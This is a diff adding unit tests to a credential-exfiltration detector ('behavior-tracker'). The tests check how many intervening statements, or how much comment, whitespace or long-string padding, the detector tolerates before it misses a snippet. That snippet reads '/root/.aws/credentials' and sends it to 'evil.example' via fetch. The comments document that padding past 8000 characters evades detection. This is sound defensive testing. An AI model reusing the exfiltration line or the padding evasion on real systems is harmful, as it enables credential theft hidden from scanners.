@@ -268,6 +268,81 @@ test('F-73: genuine close-proximity credential exfil still fires CRITICAL', (bt)
     for (const n of [0, 1, 2, 3, 4]) assert.ok(caughtAt(n), `must be caught through ${n} real intervening statements`);
     for (const n of [5, 6, 8]) assert.ok(!caughtAt(n), `must fall off at ${n} real intervening statements (documented structural limit)`);
   });
+
+  // ── F-81 (PENTEST-003 finding) ──────────────────────────────────────────────
+  // buildSeparatorPrefix() previously counted only literal ';' '{' '}' -- a sequence of ASI-style
+  // statements (no semicolons, no braces) accumulated ZERO separators no matter how many there
+  // were, so the evasion-limit invariant above (falls off at >=5 real statements) silently did NOT
+  // hold for semicolon-free code. Same shape as the test above, but with the padding statements
+  // written WITHOUT semicolons (one per line, relying on Automatic Semicolon Insertion) -- must
+  // show the identical falls-off-at-5 boundary, proving the newline-boundary counting closes the
+  // gap without changing the tuned threshold.
+  test('F-81: ASI-style (semicolon-free) intervening statements are still counted -- same falls-off-at-5 boundary', (bt) => {
+    const front = `const s = fs.readFileSync('/root/.aws/credentials');`;
+    const back = `fetch('http://evil.example/?d='+s);`;
+    const asiStmts = (n) => (n === 0 ? '' : '\n' + Array.from({ length: n }, (_, i) => `const x${i} = ${i}`).join('\n') + '\n');
+    const caughtAt = (n) => {
+      bt.reset();
+      const v = bt.analyzeModule('e.js', front + asiStmts(n) + back);
+      return v.some((x) => x.rule === 'CREDENTIAL_EXFILTRATION' && x.severity === 'CRITICAL');
+    };
+    for (const n of [0, 1, 2, 3, 4]) assert.ok(caughtAt(n), `must be caught through ${n} ASI-style intervening statements (no semicolons)`);
+    for (const n of [5, 6, 8, 20, 100]) assert.ok(!caughtAt(n), `must fall off at ${n} ASI-style intervening statements, matching the semicolon-terminated boundary (F-81 fix)`);
+  });
+
+  // Regression proof: reverting the F-81 newline-boundary counting must make this test fail --
+  // i.e. arbitrarily many ASI statements evade with the pre-fix code. Verified manually during
+  // development (not re-asserted here to avoid coupling the test file to internal function
+  // access); see the commit message for the before/after evidence.
+
+  // ── F-81 corrected claim: comment/whitespace padding immunity is bounded by
+  // CORRELATION_MAX_CHARS, not literally unlimited ────────────────────────────
+  // An earlier version of this file's comments claimed correlation was "invariant to arbitrarily
+  // large comment/whitespace padding." That was an overclaim: withinContext()'s character cap
+  // (CORRELATION_MAX_CHARS = 8000) is ANDed with the separator cap, so it excludes a window
+  // regardless of how separator-immune the padding composition is. This test asserts the HONEST
+  // boundary instead of only testing sizes safely below it: caught well past the old 1000-char
+  // spot-check, falls off exactly at the character cap, for BOTH comment and whitespace padding.
+  test('F-81: comment/whitespace padding immunity holds well past 1000 chars, falls off at the CORRELATION_MAX_CHARS boundary (8000)', (bt) => {
+    const front = `const s = fs.readFileSync('/root/.aws/credentials');`;
+    const back = `fetch('http://evil.example/?d='+s);`;
+    const commentPad = (n) => (n === 0 ? '' : '\n/*' + 'x'.repeat(Math.max(0, n - 4)) + '*/\n');
+    const wsPad = (n) => (n === 0 ? '' : '\n' + ' '.repeat(n) + '\n');
+    const caughtAt = (padFn, n) => {
+      bt.reset();
+      const v = bt.analyzeModule('e.js', front + padFn(n) + back);
+      return v.some((x) => x.rule === 'CREDENTIAL_EXFILTRATION' && x.severity === 'CRITICAL');
+    };
+    for (const padFn of [commentPad, wsPad]) {
+      for (const n of [1000, 5000, 7000, 7900]) {
+        assert.ok(caughtAt(padFn, n), `must stay caught with ${n} chars of padding (well below the character cap)`);
+      }
+      for (const n of [8000, 9000, 20000]) {
+        assert.ok(!caughtAt(padFn, n), `must fall off at ${n} chars of padding (at/above CORRELATION_MAX_CHARS=8000) -- the disclosed, honest ceiling`);
+      }
+    }
+  });
+
+  // ── F-81 disclosed residual limit: a single arbitrarily long statement ─────
+  // NOT fixed, and cannot be fixed by this correlation primitive (see the design-limit note on
+  // buildSeparatorPrefix in behavior-tracker.js): a single real statement with no ';{}' anywhere
+  // in it (one huge string-literal assignment, no internal newline) is genuinely one statement,
+  // zero real separators, so it is bounded ONLY by the character cap -- exactly like comment/
+  // whitespace padding, and with the identical falls-off-at-8000 boundary. This test exists to
+  // keep that boundary explicit and asserted, not silently missed, per this repo's own bar for
+  // "fixed" (documents the known evasion limit rather than hiding it).
+  test('F-81 disclosed limit: a single long separator-free statement evades past the character cap (inherent, documented, not closable by this primitive)', (bt) => {
+    const front = `const s = fs.readFileSync('/root/.aws/credentials');`;
+    const back = `fetch('http://evil.example/?d='+s);`;
+    const singleStatementPad = (n) => '\n' + 'const filler = "' + 'x'.repeat(Math.max(0, n - 20)) + '"\n';
+    const caughtAt = (n) => {
+      bt.reset();
+      const v = bt.analyzeModule('e.js', front + singleStatementPad(n) + back);
+      return v.some((x) => x.rule === 'CREDENTIAL_EXFILTRATION' && x.severity === 'CRITICAL');
+    };
+    assert.ok(caughtAt(1000), 'a short single filler statement must still be caught (well below the character cap)');
+    assert.ok(!caughtAt(9000), 'DISCLOSED LIMIT: a single ~9000-char separator-free statement evades -- documented, not silently missed (PENTEST-003)');
+  });
 }
 
 console.log(`\nAll behavior-tracker unit tests passed (${passed}).`);
